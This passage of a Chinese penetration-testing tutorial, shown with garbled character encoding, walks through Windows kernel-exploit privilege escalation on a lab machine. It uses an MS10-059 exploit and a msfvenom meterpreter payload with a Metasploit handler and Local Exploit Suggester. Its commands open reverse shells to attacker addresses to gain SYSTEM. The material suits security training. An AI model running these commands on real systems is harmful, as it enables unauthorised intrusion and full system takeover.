å½“æ‰§è¡Œè¿™ä¸ªåˆ©ç”¨çš„æ—¶å€™ï¼Œå®ƒä¼šè¢«æŒ‚èµ·ã€‚å½“æˆ‘ä»¬ç­‰å¾…å¤§çº¦ 20 ç§’ï¼Œç„¶åæŒ‰ä¸¤æ¬¡å›è½¦é”®ï¼Œå°±ä¼šå¾—åˆ° SYSTEM shellã€‚

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843982-353871000.png)

ã€**ç¤ºä¾‹4**ã€‘æœ€åä¸€ä¸ªä¾‹å­åœ¨å½“å‰è¿™å° win7 æœºå™¨ä¸Šä¸å­˜åœ¨æ¼æ´ï¼Œä½†å®ƒä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å†…æ ¸æ¼æ´ï¼Œé‚£å°±æ˜¯ MS10-059 æˆ– "Chimichurri"ã€‚

**æ³¨ï¼šä¸‹é¢çš„ç¤ºä¾‹æ˜¯åœ¨ hackthebox çš„ç›’å­ä¸Šè¿›è¡Œçš„ã€‚**

å°†æ¼æ´åˆ©ç”¨ç¨‹åºä¼ è¾“ç»™å—å®³è€…ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ç›´æ¥è¿è¡Œå®ƒä»¥æŸ¥çœ‹å…¶å‘½ä»¤ç”¨æ³•ï¼š

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843183-1639697198.png)

è¿™ä¸ªåˆ©ç”¨ç¨‹åºä¼šå‘æ”»å‡»è€…çš„æœºå™¨æ¨é€ä¸€ä¸ªåå‘ shellï¼Œè¿™ä¸æˆ‘ä»¬åˆšæ‰çœ‹åˆ°çš„â€œå°±åœ°â€æå‡ç¤ºä¾‹æœ‰äº›ä¸åŒã€‚è¿™æ„å‘³ç€æˆ‘ä»¬éœ€è¦åœ¨æ”»å‡»è€…æœºå™¨ä¸Šå¯åŠ¨ä¸€ä¸ª netcat ç›‘å¬å™¨ã€‚

    .\MS10-059.exe 10.10.14.6 9999
    

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843307-852807124.png)

æ‰§è¡Œå‘½ä»¤åä¼šå‡ºç°ä¸€æ¡å¾ˆä»¤äººé«˜å…´çš„æç¤ºä¿¡æ¯ã€‚ç„¶åå›åˆ°ç›‘å¬å™¨åï¼Œæˆ‘ä»¬æ”¶åˆ°äº†ä¸€ä¸ª SYSTEM shellï¼

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843709-348061030.png)

> æˆ‘ç»™ä½ ä¸¾äº† 4 ä¸ªä¾‹å­ï¼Œä½†è¿˜æœ‰å¾ˆå¤šä»åå‘ shell è¿è¡Œçš„ä¾‹å­éœ€è¦ä½ è‡ªå·±å»å‘ç°å»æµ‹è¯•ğŸ™‚ã€‚æç¤ºï¼šåœ¨[å†…æ ¸åˆ©ç”¨åˆ—è¡¨](https://github.com/SecWiki/windows-kernel-exploits)ä¸­çš„æ¼æ´åˆ©ç”¨ç¨‹åºæœ‰æ—¶å€™ä¼šé™„å¸¦å·¥å…·ä½¿ç”¨æˆªå›¾ï¼Œæˆ‘ä»¬å¯ä»¥ä»æˆªå›¾ä¸­çœ‹å‡ºè¯¥æ¼æ´åˆ©ç”¨æ˜¯ä¸æ˜¯ä»¥åå‘ shell çš„æ–¹å¼å»ä½¿ç”¨çš„ã€‚

**

4ã€é€šè¿‡ Metasploit æŸ¥æ‰¾åŠä½¿ç”¨å†…æ ¸åˆ©ç”¨

**
---------------------------------

ã€**ç¤ºä¾‹5**ã€‘Metasploit æ˜¯é€šè¿‡å†…æ ¸åˆ©ç”¨æ¥æå‡æƒé™çš„ç»ä½³å·¥å…·ã€‚

å€ŸåŠ© Metasploitï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶å†…ç½®çš„æœ¬åœ°æ¼æ´åˆ©ç”¨å»ºè®®æ¨¡å—ï¼ˆLocal Exploit Suggesterï¼‰æ¥åˆ—ä¸¾æ½œåœ¨å¯ç”¨çš„å†…æ ¸åˆ©ç”¨ã€‚ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ Metasploit ä¸­é€ä¸€å»æµ‹è¯•å®ƒä»¬ï¼Œå› ä¸ºå®ƒæ˜¾ç¤ºå‡ºæ¥çš„æ¼æ´åˆ©ç”¨éƒ½æ˜¯åœ¨ Metasploit ä¸­å®é™…å­˜åœ¨çš„æ¨¡å—ã€‚

è¦å‡çº§å½“å‰æˆ‘ä»¬è·å¾—çš„ç«‹è¶³ç‚¹çš„ cmd shell åˆ° Meterpreter shelï¼Œæˆ‘ä»¬å¯ä»¥å¿«é€Ÿç”Ÿæˆä¸€ä¸ªæœ‰æ•ˆè½½è·ï¼Œç„¶åå°†å…¶è½¬ç§»ç»™å—å®³è€…ï¼Œä¾‹å¦‚ï¼š

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x86 --platform Windows -f exe -o meter86.exe
    

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191842931-343756380.png)

æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ Metasploit ä¸­å¯åŠ¨ä¸€ä¸ª multi-handler ç›‘å¬å™¨ï¼š

    msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 172.16.1.30;set LPORT 443;exploit;"
    

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843603-546478873.png)

ç„¶ååœ¨å—å®³è€…æœºå™¨ä¸Šæ‰§è¡Œè¯¥è½½è·ã€‚

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843369-993192543.png)

æœ€åï¼Œå›åˆ° multi-handler ç›‘å¬å™¨ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª meterpreter shell äº§ç”Ÿäº†ã€‚

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843700-487385820.png)

æ–°äº§ç”Ÿçš„ meterpreter çš„ä¼šè¯ç¼–å·æ˜¯ 1ï¼Œè¿™å¾ˆé‡è¦ï¼Œæˆ‘ä»¬éœ€è¦è®°ä½è¿™ä¸ªç¼–å·ã€‚

ä»è¿™é‡Œå¼€å§‹ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥åŠ è½½ Local Exploit Suggester æ¨¡å—ã€‚

    background
    search suggester
    use 0
    set SESSION 1
    exploit
    

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843893-656489477.png)

å¤§çº¦ 30 ç§’åï¼ŒMetasploit ä¼šåˆ—å‡ºæˆ‘ä»¬å¯ä»¥ç”¨æ¥å¯¹ä»˜è¿™å°ä¸»æœºçš„æ½œåœ¨å†…æ ¸æ¼æ´åˆ©ç”¨ã€‚

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843817-177682345.png)

ç°åœ¨ï¼Œæˆ‘ä»¬éœ€è¦é€ä¸€å¯¹è¿™äº›æ¼æ´è¿›è¡Œæµ‹è¯•ï¼Œç›´åˆ°è·å¾— SYSTEM shell ä¸ºæ­¢ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬è·³è¿‡æµ‹è¯• UAC ç»•è¿‡å’Œ MS10-XXX ç›¸å…³çš„æ¨¡å—ï¼Œç›´æ¥ä» MS13-053 æ¨¡å—å¼€å§‹æµ‹è¯•ã€‚ã€æ³¨ï¼šè¿™é‡Œä¸»è¦ä¼˜å…ˆä»¥å†…æ ¸æ¼æ´åˆ©ç”¨ä¸ºä¸»ï¼Œæ‰€ä»¥ UAC ç›¸å…³æ¨¡å—ç›´æ¥è·³è¿‡ï¼›å› ä¸ºé‚£ä¸ªè¡¥ä¸çš„åŸå› ï¼Œæ‰€ä»¥æˆ‘ä»¬çŸ¥é“ MS10-XXX æ¨¡å—åœ¨è¿™å°æœºå™¨ä¸Šå¤§æ¦‚ç‡æ˜¯æ— æ³•ä½¿ç”¨çš„ï¼Œæ•…ç›´æ¥è·³è¿‡ã€‚ã€‘

å¯¹äºæ‰€æœ‰è¿™äº›æ¼æ´åˆ©ç”¨æ¨¡å—ï¼Œæˆ‘ä»¬éƒ½éœ€è¦è®¾ç½® LHOSTã€LPORT å’Œ SESSION å­—æ®µã€‚LPORT å¿…é¡»ä¸åŒäºå‰é¢è·å– Meterpreter ä¼šè¯æ—¶ä½¿ç”¨çš„ 443 ç«¯å£ã€‚

> Kitrap0d æ˜¯ä¸€ä¸ªéå¸¸å¯é çš„å†…æ ¸åˆ©ç”¨ï¼Œä½†å¯¹äºå½“å‰è¿™å°æœºå™¨æ˜¯æ— æ•ˆçš„ã€‚

    use exploit/windows/local/ms13_053_schlamperei
    set LHOST 172.16.1.30
    set LPORT 8080
    set SESSION 1
    exploit
    

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843879-132742142.png)

ç»è¿‡å‡ æ¬¡ä¸æ–­çš„å°è¯•ï¼Œæˆ‘ä»¬æœ€ç»ˆæˆåŠŸè·å¾—äº† SYSTEM shellï¼

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843595-1953975783.png)

> å¯¹äº Suggester ä¸ºæˆ‘ä»¬æ‰¾åˆ°çš„å¤§å¤šæ•°å†…æ ¸æ¼æ´ï¼Œåªè¦å®ƒæ˜¾ç¤ºâ€œThe target appears to be vulnerableâ€ï¼Œé‚£å°±å¾ˆæœ‰å¯èƒ½ä¼šè¢«æˆåŠŸæå‡åˆ° SYSTEMã€‚